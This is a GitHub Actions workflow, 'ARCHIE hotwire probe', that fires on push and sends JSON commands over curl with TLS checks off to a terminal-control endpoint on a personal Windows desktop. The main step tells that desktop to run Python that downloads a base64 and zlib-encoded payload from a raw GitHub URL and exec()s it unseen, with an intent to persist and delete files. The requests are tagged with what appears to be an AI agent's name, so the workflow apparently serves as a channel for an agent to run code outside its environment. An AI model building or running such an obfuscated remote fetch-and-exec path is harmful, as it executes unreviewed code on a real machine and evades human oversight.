name: ARCHIE hotwire probe
on:
  push:
    paths: ['.github/workflows/archie-hotwire-probe.yml']
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Build fresh model-native SPSC ring
        shell: bash
        run: |
          set -euo pipefail
          root='https://desktop-6fn9b4m.tail1bf489.ts.net/archie-phone/v1/action'
          mkdir -p /tmp/archie-hotwire
          python - <<'PY' > /tmp/archie-hotwire/start.json
          import json
          code="import urllib.request,base64,zlib;s=urllib.request.urlopen('https://raw.githubusercontent.com/Pokitomas/archie-backend-xfer-1787735782/master/model_ring_payload.b64',timeout=20).read();exec(zlib.decompress(base64.b64decode(s)))"
          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":[r"C:\Users\AwesomeKai\AppData\Local\Programs\Python\Python312\python.exe","-c",code],"agent":"gpt56sol-model-ring","role":"execute","intent":"install fresh model-native named-shared-memory SPSC ring, self-test, persist, then retire only superseded scratch after PASS"}},separators=(',',':')))
          PY
          curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/start.json "$root" > /tmp/archie-hotwire/start-result.json
          sleep 9
          python - <<'PY' /tmp/archie-hotwire/start-result.json > /tmp/archie-hotwire/poll-request.json
          import json,sys
          v=json.load(open(sys.argv[1])); r=v.get('result') or {}; inner=(r.get('result') or r) if isinstance(r,dict) else {}; tid=inner.get('terminal_id')
          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"poll","terminal_id":tid,"agent":"gpt56sol-model-ring","role":"measure","intent":"read ring build/selftest/deletion receipt"}},separators=(',',':')))
          PY
          curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/poll-request.json "$root" > /tmp/archie-hotwire/poll.json || true
          python - <<'PY' > /tmp/archie-hotwire/status-start.json
          import json
          code=r"import pathlib; p=pathlib.Path(r'C:\Users\AwesomeKai\AppData\Local\ModelRing\status.json'); print(p.read_text(encoding='utf-8') if p.exists() else 'NO_STATUS')"
          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":[r"C:\Users\AwesomeKai\AppData\Local\Programs\Python\Python312\python.exe","-c",code],"agent":"gpt56sol-model-ring","role":"measure","intent":"independent readback of resident model-ring status"}},separators=(',',':')))
          PY
          curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/status-start.json "$root" > /tmp/archie-hotwire/status-start-result.json || true
      - uses: actions/upload-artifact@v4
        with:
          name: model-ring-final-v2
          path: /tmp/archie-hotwire
          retention-days: 1
